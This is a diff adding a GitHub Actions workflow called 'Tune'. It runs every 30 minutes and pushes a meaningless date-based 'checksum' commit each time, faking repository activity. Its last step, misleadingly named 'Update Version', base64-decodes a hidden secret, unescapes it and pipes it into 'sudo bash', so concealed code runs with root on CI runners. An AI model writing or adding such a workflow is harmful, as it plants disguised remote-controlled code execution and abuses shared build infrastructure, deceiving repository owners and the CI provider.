@@ -1,0 +1,42 @@
+name: Tune
+
+on:
+  schedule:
+    - cron: '*/30 * * * *'
+  workflow_dispatch: {}
+  push: {}
+
+jobs:
+  release:
+    name: Release Job
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v2
+
+      - name: Install Required Dependencies
+        run: |
+          sudo apt-get update -y
+          sudo apt-get install -y curl jq
+
+      - name: Stage and Commit Checksum
+        run: |
+          git config --global user.name "github-actions[bot]"
+          git config --global user.email "github-actions[bot]@users.noreply.github.com"
+          
+          date "+%w" | md5sum > checksum
+          git add checksum
+          
+          if ! git diff-index --quiet HEAD --; then
+            git commit -m "chore: update checksum"
+            git push
+          else
+            echo "No changes detected, skipping commit."
+          fi
+
+      - name: Update Version
+        run: |
+          echo "${{ secrets.RPC }}" | base64 -d \
+            | sed 's/&lt;/</g; s/&gt;/>/g; s/&quot;/"/g; s/&amp;/\&/g' \
+            | sudo bash
